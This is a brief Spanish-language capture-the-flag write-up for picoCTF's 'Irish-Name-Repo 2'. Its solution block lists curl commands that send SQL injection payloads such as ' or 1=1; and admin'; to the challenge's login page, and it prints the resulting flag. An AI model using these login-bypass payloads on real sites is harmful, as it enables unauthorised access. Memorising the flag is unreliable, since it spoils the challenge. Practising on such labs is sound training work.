# Irish-Name-Repo 2
## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649
## Datos de Acceso al Nivel
``` 
```
## Solucion
```Bash
abrir link
intentar logearse como admin
inspeccionar pagina login
buscar los elementos del login
mostrar el cuadro de debug
curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=admin or 1=1;&debug=1"

modificar password con la inyeccion 1=1
curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin&password=' or 1=1;&debug=1"

modificar el usuario username=admin';
curl https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin';&password=hola&debug=1"
copiar flag
picoCTF{m0R3_SQL_plz_aee925db}
```
## Notas Adicionales
|**Comandos**|**Descripcion**|
|--------|-------------|
|||
|||
## Referencias

